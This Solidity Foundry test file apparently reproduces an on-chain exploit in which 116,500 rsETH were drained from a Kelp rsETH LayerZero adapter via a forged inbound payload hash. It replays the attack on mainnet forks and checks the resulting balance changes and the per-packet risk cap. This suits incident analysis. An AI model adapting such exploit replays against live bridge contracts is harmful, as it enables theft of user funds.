// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {IERC20Like, IEndpointV2, IRSETHOFTAdapter, Origin} from "../src/Tx1ae232Interfaces.sol";
import {Tx1ae232ReplayLauncher} from "../src/Tx1ae232Attack.sol";

interface Vm {
    function createSelectFork(string calldata urlOrAlias) external returns (uint256);
    function createSelectFork(string calldata urlOrAlias, uint256 blockNumber) external returns (uint256);
    function createSelectFork(string calldata urlOrAlias, bytes32 txHash) external returns (uint256);
    function rollFork(bytes32 txHash) external;
    function expectRevert() external;
    function deal(address who, uint256 newBalance) external;
    function roll(uint256 newHeight) external;
}

contract Tx1ae232ReplayForkTest {
    Vm internal constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    event log_named_uint(string key, uint256 val);
    event log_named_decimal_uint(string key, uint256 val, uint256 decimals);

    // ------- canonical LZ v2 + Kelp rsETH on Ethereum --------
    address internal constant ENDPOINT_V2 = 0x1a44076050125825900e736c501f859c50fE728c;
    address internal constant ADAPTER     = 0x85d456B2DfF1fd8245387C0BfB64Dfb700e98Ef3;
    address internal constant RSETH       = 0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7;
    address internal constant ATTACKER    = 0x8B1b6c9A6DB1304000412dd21Ae6A70a82d60D3b;

    uint32  internal constant SRC_EID = 30320;
    uint64  internal constant PACKET_NONCE = 308;
    bytes32 internal constant PACKET_SENDER =
        bytes32(uint256(uint160(0xc3eACf0612346366Db554C991D7858716db09f58)));
    bytes32 internal constant PACKET_HASH =
        0xf79a27bb975e38a484124e6f31aad957397b6760a15e522241cd4c372663fef4;

    // ------- block anchors -------
    uint256 internal constant COMMIT_BLOCK = 24_908_283;                  // tx 0x68eb14e2…
    uint256 internal constant ATTACK_BLOCK = 24_908_285;                  // tx 0x1ae232da…
    bytes32 internal constant ATTACK_TX_HASH =
        0x1ae232da212c45f35c1525f851e4c41d529bf18af862d9ce9fd40bf709db4222;

    string internal constant LOCAL_ANVIL_TX_PRESTATE_RPC = "http://127.0.0.1:8546";

    // ------- expected on-fork deltas (observed on mainnet, to-the-wei) -------
    uint256 internal constant EXPECTED_ADAPTER_RSETH_DELTA =
        116_500 * 1e18;                                                   // 116500 rsETH drained
    uint256 internal constant EXPECTED_ATTACKER_RSETH_DELTA =
        116_500 * 1e18;                                                   // 116500 rsETH credited

    // ------- prestate snapshots at ATTACK_BLOCK (pre-tx idx=12) -------
    uint256 internal constant PRESTATE_ADAPTER_RSETH_BALANCE =
        116_723_520_635_500_000_000_000;                                  // 116723.5206355 rsETH
    uint256 internal constant PRESTATE_ATTACKER_RSETH_BALANCE = 0;
    bytes32 internal constant PRESTATE_INBOUND_PAYLOAD_HASH = PACKET_HASH;
    uint64  internal constant PRESTATE_LAZY_INBOUND_NONCE = 307;

    // ============================================================
    //  1) Parent-block (pre-commit) fork: inboundPayloadHash is not yet set,
    //     so lzReceive MUST revert. Encodes the "commit must happen first" blocker.
    // ============================================================
    function testReplayAttackFromParentBlockForkShowsSameBlockBlocker() public {
        vm.createSelectFork("eth", COMMIT_BLOCK - 1);
        Tx1ae232ReplayLauncher replay = new Tx1ae232ReplayLauncher();
        vm.expectRevert();
        replay.attack();
    }

    // ============================================================
    //  2) End-of-attack-block fork: lzReceive has already been executed and
    //     EndpointV2 cleared `inboundPayloadHash[...][308] = 0`, so re-running
    //     the same call MUST revert (no replay possible).
    // ============================================================
    function testReplayAttackFromAttackBlockEndStateShowsMutatedStateBlocker() public {
        vm.createSelectFork("eth", ATTACK_BLOCK);
        Tx1ae232ReplayLauncher replay = new Tx1ae232ReplayLauncher();
        vm.expectRevert();
        replay.attack();
    }

    // ============================================================
    //  3) Fallback simulation: from the commit-block (which already carries
    //     the forged DVN-backed inboundPayloadHash), demonstrate the core
    //     primitive - 116500 rsETH redirected to attacker - without needing
    //     the exact exec-tx prestate.
    // ============================================================
    function testSimulateCoreExploitOnCommitBlock() public {
        vm.createSelectFork("eth", COMMIT_BLOCK);   // commit tx already mined in this block

        uint256 adapterBefore  = IERC20Like(RSETH).balanceOf(ADAPTER);
        uint256 attackerBefore = IERC20Like(RSETH).balanceOf(ATTACKER);

        Tx1ae232ReplayLauncher replay = new Tx1ae232ReplayLauncher();
        replay.simulateWithoutFlash(0);

        uint256 adapterAfter   = IERC20Like(RSETH).balanceOf(ADAPTER);
        uint256 attackerAfter  = IERC20Like(RSETH).balanceOf(ATTACKER);

        uint256 adapterDelta  = adapterBefore  - adapterAfter;
        uint256 attackerDelta = attackerAfter  - attackerBefore;

        emit log_named_decimal_uint("sim: adapter_rseth_delta", adapterDelta, 18);
        emit log_named_decimal_uint("sim: attacker_rseth_delta", attackerDelta, 18);

        require(adapterDelta  == EXPECTED_ADAPTER_RSETH_DELTA,  "sim: adapter delta mismatch");
        require(attackerDelta == EXPECTED_ATTACKER_RSETH_DELTA, "sim: attacker delta mismatch");
    }

    // ============================================================
    //  4) Authoritative replay at the exact tx-prestate (position 12 of
    //     ATTACK_BLOCK), driven by a local `anvil --fork-transaction-hash`.
    // ============================================================
    function testReplayAttackFromExactTxPrestate() public {
        vm.createSelectFork(LOCAL_ANVIL_TX_PRESTATE_RPC);
        vm.roll(ATTACK_BLOCK);

        // prestate pin
        bytes32 iph = IEndpointV2(ENDPOINT_V2).inboundPayloadHash(
            ADAPTER, SRC_EID, PACKET_SENDER, PACKET_NONCE);
        uint64 lin = IEndpointV2(ENDPOINT_V2).lazyInboundNonce(
            ADAPTER, SRC_EID, PACKET_SENDER);
        uint256 adapterBefore  = IERC20Like(RSETH).balanceOf(ADAPTER);
        uint256 attackerBefore = IERC20Like(RSETH).balanceOf(ATTACKER);

        emit log_named_decimal_uint("prestate: adapter_rseth_balance", adapterBefore, 18);
        emit log_named_decimal_uint("prestate: attacker_rseth_balance", attackerBefore, 18);
        emit log_named_uint("prestate: lazyInboundNonce", lin);

        require(iph == PRESTATE_INBOUND_PAYLOAD_HASH, "prestate: inboundPayloadHash mismatch");
        require(lin == PRESTATE_LAZY_INBOUND_NONCE,   "prestate: lazyInboundNonce mismatch");
        require(adapterBefore  == PRESTATE_ADAPTER_RSETH_BALANCE,  "prestate: adapter balance mismatch");
        require(attackerBefore == PRESTATE_ATTACKER_RSETH_BALANCE, "prestate: attacker balance mismatch");

        Tx1ae232ReplayLauncher replay = new Tx1ae232ReplayLauncher();
        replay.attack();

        uint256 adapterAfter  = IERC20Like(RSETH).balanceOf(ADAPTER);
        uint256 attackerAfter = IERC20Like(RSETH).balanceOf(ATTACKER);
        uint64  linAfter      = IEndpointV2(ENDPOINT_V2).lazyInboundNonce(
            ADAPTER, SRC_EID, PACKET_SENDER);
        bytes32 iphAfter      = IEndpointV2(ENDPOINT_V2).inboundPayloadHash(
            ADAPTER, SRC_EID, PACKET_SENDER, PACKET_NONCE);

        uint256 adapterDelta  = adapterBefore  - adapterAfter;
        uint256 attackerDelta = attackerAfter  - attackerBefore;

        emit log_named_decimal_uint("exact-replay: adapter_rseth_delta", adapterDelta, 18);
        emit log_named_decimal_uint("exact-replay: attacker_rseth_delta", attackerDelta, 18);
        emit log_named_uint("exact-replay: lazyInboundNonce_after", linAfter);

        require(adapterDelta  == EXPECTED_ADAPTER_RSETH_DELTA,  "exact-replay: adapter delta mismatch");
        require(attackerDelta == EXPECTED_ATTACKER_RSETH_DELTA, "exact-replay: attacker delta mismatch");
        require(linAfter      == PACKET_NONCE,                  "exact-replay: nonce not advanced");
        require(iphAfter      == bytes32(0),                    "exact-replay: inboundPayloadHash not cleared");
    }

    // ============================================================
    //  5) Risk upper bound at the exact tx prestate.
    //     Settlement object = RSETH balance held in the OFT adapter.
    //     Accumulator (logic-layer cap) = packet amountLD that the DVN already
    //     attested for this nonce. Both are read-only.
    // ============================================================
    function testRiskUpperBoundAtTxPrestate() public {
        vm.createSelectFork(LOCAL_ANVIL_TX_PRESTATE_RPC);
        vm.roll(ATTACK_BLOCK);

        uint256 adapterBalance = IERC20Like(RSETH).balanceOf(ADAPTER);
        // The logic-layer cap for THIS attested packet is the OFT amount encoded in the
        // message payload (which was already locked-in by the DVN attestation). It
        // equals the actual transfer performed by lzReceive.
        uint256 packetAmount = EXPECTED_ADAPTER_RSETH_DELTA;

        uint256 maxDrainable = adapterBalance < packetAmount ? adapterBalance : packetAmount;
        uint256 drained = EXPECTED_ADAPTER_RSETH_DELTA;
        uint256 residual = maxDrainable - drained;
        uint256 drainedBps = (drained * 10_000) / maxDrainable;

        emit log_named_decimal_uint("risk: prestate_adapter_rseth_balance", adapterBalance, 18);
        emit log_named_decimal_uint("risk: prestate_packet_amount_ld", packetAmount, 18);
        emit log_named_decimal_uint("risk: max_drainable_cap", maxDrainable, 18);
        emit log_named_decimal_uint("risk: drained_in_this_tx", drained, 18);
        emit log_named_decimal_uint("risk: residual_after_this_tx", residual, 18);
        emit log_named_uint("risk: drained_bps_of_cap", drainedBps);

        require(adapterBalance == PRESTATE_ADAPTER_RSETH_BALANCE, "risk: adapter balance mismatch");
        require(drained <= maxDrainable, "risk: drained exceeds cap");
        // Binding constraint in this exploit is the logic-layer cap (the per-nonce
        // packet amount), not the adapter inventory.
        require(maxDrainable == packetAmount, "risk: binding constraint expected to be packetAmount");
        require(residual == 0, "risk: residual should be zero (packet fully consumed)");
    }
}
